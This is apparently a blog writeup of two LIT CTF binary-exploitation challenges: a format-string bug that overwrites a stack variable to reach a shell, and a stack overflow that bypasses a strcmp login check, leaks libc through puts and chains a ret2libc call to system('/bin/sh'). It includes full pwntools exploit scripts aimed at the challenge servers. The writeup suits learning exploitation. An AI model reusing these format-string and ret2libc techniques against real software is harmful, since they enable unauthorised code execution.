---
title: Lit_CTF Writeups
published: 2025-08-25
description: Writeups for pwn challenge.
tags: [pwn, writeups, Ret2Libc, foramt_string]
category: Pwn
draft: false
---

# Flippen_Printf
`Author:`w0152  
`Description`  
I can't seem to pull of a bit flip. Can you?  

```bash
󰣇 lit_ctf/pwn/flippen_printf ❯ file uc                                                                                    
uc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7049e959cebc100a110b399bc69e61f4370efc6c, for GNU/Linux 3.2.0, not stripped
```
```bash
pwnchecksec uc                                                                                                 
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```
We can see that this Elf is full relro but has no canary enabled.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int win() {
	system("/bin/sh");
}

int main() {
	setbuf(stdout, 0);
	setbuf(stderr, 0);
	char buf[256];
	long x = 0;
	printf("Buffer located at: %p\n", buf);
	buf[read(0, buf, 256) - 1] = 0;
	printf(buf);
	if (x) win();
	exit(0);
}

```
From the Source code , there is a win function that is called only when the x is != 0.
When looking at the code we can see that there is format string vulnerability here.
```c
 	buf[read(0, buf, 256) - 1] = 0;
	printf(buf);
```
## Finding offset
```bash
󰣇 lit_ctf/pwn/flippen_printf ❯ ./uc                                                                                                     
Buffer located at: 0x7fffc1674160
AAAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAAAAAAA0x7fffc16741600x2c(nil)(nil)(nil)0x10(nil)0x41414141414141410x25702570257025410x25702570257025700x25702570257025700x25702570257025700x7707007025700x218c0329000000020x100x400x1200000
```
We can see that the Letters are Repeated at 8th Offset , so we can confirm that where out printf input buffer starts.

## Finding address of x
```asm wrap=false showLineNumbers=false
   0x555555555229 <main+70>     mov    qword ptr [rbp - 0x118], 0     [0x7fffffffd528] <= 0
   0x555555555234 <main+81>     lea    rax, [rbp - 0x110]             RAX => 0x7fffffffd530 ◂— 1
 ► 0x55555555523b <main+88>     mov    rsi, rax                       RSI => 0x7fffffffd530 ◂— 1
   0x55555555523e <main+91>     lea    rax, [rip + 0xdc7]             RAX => 0x55555555600c ◂— 'Buffer located at: %p\n'
   0x555555555245 <main+98>     mov    rdi, rax                       RDI => 0x55555555600c ◂— 'Buffer located at: %p\n'
   0x555555555248 <main+101>    mov    eax, 0                         EAX => 0
   0x55555555524d <main+106>    call   printf@plt                  <printf@plt>
```
At main+70 , we can see that value 0 is moving to $rbp-0x118 , which is the variable x.
Since the program is good enough to leak the buffer address , so we can calculate x stack address with it, where x = buf - 8.

## Exploit
```py
from pwn import *
context.binary = elf = ELF('uc')

#p = process()
p = remote('litctf.org', 31785)

p.recvuntil(b'Buffer located at: ')
buf_addr = int(p.recvline(),16)

x_addr = buf_addr - 8
payload = fmtstr_payload(8, {x_addr: 1})

p.sendline(payload)
p.interactive()%
```


# l1t\x00n3wsAAAAAAApp\n
`Description`  
Can you find an unreleased news story on the LIT Newsapp?
Note: This shares the same file as the LIT Newsapp rev challenge. The two challenges have different flags.

```bash
󰣇 lit_ctf/pwn/2ndlit ❯ file uc                                                                                                                                 
uc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6eeae81c4c16c71016051b5be540958892bd4f06, for GNU/Linux 3.2.0, not stripped
```
```bash
󰣇 lit_ctf/pwn/2ndlit ❯ pwnchecksec uc                                                                                                                         
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
We can see that , The given Elf is dynamically linked and has no canary and pie with partial Relno , which makes things easy for it.

## Code Review

```c

undefined8 main(void)

{
  int iVar1;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined8 uStack_50;
  undefined local_48 [31];
  undefined auStack_29 [33];
  
  uStack_50 = 0x4011fe;
  puts("Enter username:");
  uStack_50 = 0x401214;
  sVar2 = read(0,auStack_29 + 1,0x60);
  auStack_29[sVar2] = 0;
  uStack_50 = 0x401229;
  puts("Enter password:");
  uStack_50 = 0x40123f;
  sVar2 = read(0,local_48,0x60);
  local_48[sVar2 + -1] = 0;
  uStack_50 = 0x40125b;
  iVar1 = check(auStack_29 + 1,local_48);
  if (iVar1 == 0) {
    uStack_50 = 0x4012ae;
    puts("Invalid credentials");
    uStack_50 = 0x4012b8;
    uVar3 = FUN_004010a0(0);
  }
  else {
    uStack_50 = 0x40126b;
    puts("Welcome");
    uStack_50 = 0x401277;
    puts("---------------------------------------------------------");
    uStack_50 = 0x401283;
    puts("Today\'s news: Lexington High School starts their 5th CTF!");
    uStack_50 = 0x40128f;
    puts("---------------------------------------------------------");
    uStack_50 = 0x40129b;
    puts("Goodbye");
    uVar3 = 0;
  }
  return uVar3;
}

```
This is the main function where the program , asks the user to prompt username and password.  
If the username and password matches , the program has the heart to welcome and notify that this is the 5th LIT CTF and the program ends with a goodbye, which we don't like after noticing a buffer overflow in both the username and password.

## Find username and password
```c

undefined8 check(char *param_1,char *param_2)

{
  int iVar1;
  
  iVar1 = strcmp(param_1,"LITCTF");
  if ((iVar1 == 0) && (iVar1 = strcmp(param_2,"d0nt_57r1ngs_m3_3b775884"), iVar1 == 0)) {
    return 1;
  }
  return 0;
}

```
We can find the username and password is in check function , where our given username and password is being campared with `strcmp` function and returns 1 if it is correct username and password else it returns 0 for false.

But wait just spamming the buffer does not overflow the stack instead it prints invalid credentials.
```bash 
󰣇 lit_ctf/pwn/2ndlit ❯ ./uc                                                                                                                                
Enter username:
LITCTF
Enter password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Invalid credentials
```
Why? Because of the `check` function, which checks our username and password , since here the password is not match with the one in program , it prints invalid credentials and exits the program.
```c

void FUN_004010a0(int param_1)

{
                    /* WARNING: Subroutine does not return */
  exit(param_1);
}

```
## Apporach to control rip
Since strcmp only compares the strings until it has null byte is reached. so, we use it to write to be precise overflow beyound buffer while bypassing the check function of username and password. while still causing the segfault.


## Exploit  
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./uc_patched")
libc = ELF('libc6_2.39-0ubuntu8.4_amd64.so')
context.binary = elf
context.terminal = ['kitty','-e']

gdbscript = '''
b*main
b*check
b*0x00000000004012b8
c
'''

if args.REMOTE:
	p = remote('litctf.org',31779)
elif args.GDB:
	p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
	p = process(elf.path)

pop_rdi = 0x0000000000401323
ret = 0x000000000040101a
pop_rsi_r15 = 0x0000000000401321

def leak_value():
	payload = flat (
	pop_rdi,
	elf.got['puts'],
	elf.plt['puts']
)
	return payload

payload = leak_value()

main_addr = p64(elf.sym['main'])
main_addr_spam = cyclic(64) + main_addr + cyclic(24)
password =  main_addr_spam  +b'd0nt_57r1ngs_m3_3b775884\x00'
print(len(password))
p.recvuntil(b'Enter username:')
p.sendline( password + cyclic(128-(len(password))) +b'LITCTF\x00'+ cyclic(16) + main_addr + cyclic(9) + payload )

print(len(password + cyclic(128-(len(password))) +b'LITCTF\x00'+ cyclic(16) + main_addr + cyclic(9) + payload))

'''
p.recvuntil(b'Enter username:')
p.sendline(b'LITCTF')
p.recvuntil(b'Enter password:')
p.sendline(b'd0nt_57r1ngs_m3_3b775884\x00\nAAAAAALITCTF\x00\n'+payload)
p.recvuntil(b'Goodbye\n')

print(len(b'd0nt_57r1ngs_m3_3b775884\x00\nAAAAAALITCTF\x00\n'+payload))
read = leak_value()
'''


p.recvuntil(b'Goodbye\n')
leak = p.recvuntil(b"\n", drop=True)   # grab until newline
log.info(f"raw leak: {leak}")

#leak = p.recvline().strip()       
leaked_puts = u64(leak.ljust(8, b'\x00'))
print(hex(leaked_puts))


print('puts lib addr',hex(libc.sym.puts))

libc.address = leaked_puts - libc.sym.puts
print(hex(libc.address))

system_addr = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))

def shellcode():
	payload = flat (
	pop_rdi,
	binsh,
	system_addr
	)
	return payload

shellcode = shellcode()
p.recvuntil(b'Enter password:')
p.sendline(b'd0nt_57r1ngs_m3_3b775884\x00\nAAAAAALITCTF\x00\n'+cyclic(32)+main_addr)

main_addr_spam = cyclic(64) + shellcode + cyclic(8)
password =  main_addr_spam  +b'd0nt_57r1ngs_m3_3b775884\x00'
print(len(password))
p.recvuntil(b'Enter username:')
p.sendline( password + cyclic(128-(len(password))) +b'LITCTF\x00'+ cyclic(16) + main_addr + cyclic(9) + payload )



p.interactive()
```
